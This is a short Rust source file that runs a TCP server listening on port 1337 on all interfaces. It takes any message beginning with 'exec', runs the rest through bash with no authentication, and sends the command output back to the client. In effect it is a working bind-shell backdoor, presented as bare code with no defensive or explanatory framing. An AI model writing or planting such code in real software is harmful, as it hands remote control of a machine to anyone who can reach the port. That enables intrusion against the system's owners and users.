use std::net;
use std::process::*;
use std::io::prelude::*;
use std::io::{BufRead, BufReader};

fn handle_client(mut client: net::TcpStream) -> isize
{
    let mut result: isize = 0;
    let mut buf = String::new();

    loop {
        match client.read_to_string(&mut buf) {
            Ok(_) => break,
            Err(_) => {
            },
        };
    };
    if buf.starts_with("exec") {
        let mut child = Command::new("bash")
            .arg("-c")
            .arg(format!("\"{}\"", &buf[5..]))
            .stdout(Stdio::piped())
            .spawn()
            .unwrap();

        if let Some(stdout) = child.stdout.take() {
            let reader = BufReader::new(stdout);
            for line in reader.lines() {
                let _ = client.write_all(line.unwrap().as_bytes());
                let _ = client.write_all(b"\n");
            }
        }
        
        let status = child.wait().unwrap();
    }
    if buf.starts_with("quit") {
        result = -1;
    }

    return result;
}

pub fn start_server()
{
    let server_wrap = net::TcpListener::bind("0.0.0.0:1337");
    let server: net::TcpListener;
    let mut result: isize = 0;

    match server_wrap {
        Err(_) => {
            // mean server is already running closing
            return;
        }
        Ok(res) => {
            server = res;
        }
    }
    loop {
        match server.accept() {
            Err(_) => {}
            Ok(tuple) => {
                result = handle_client(tuple.0);
            }
        }
        if result == -1 {
            break;
        }
    }
}
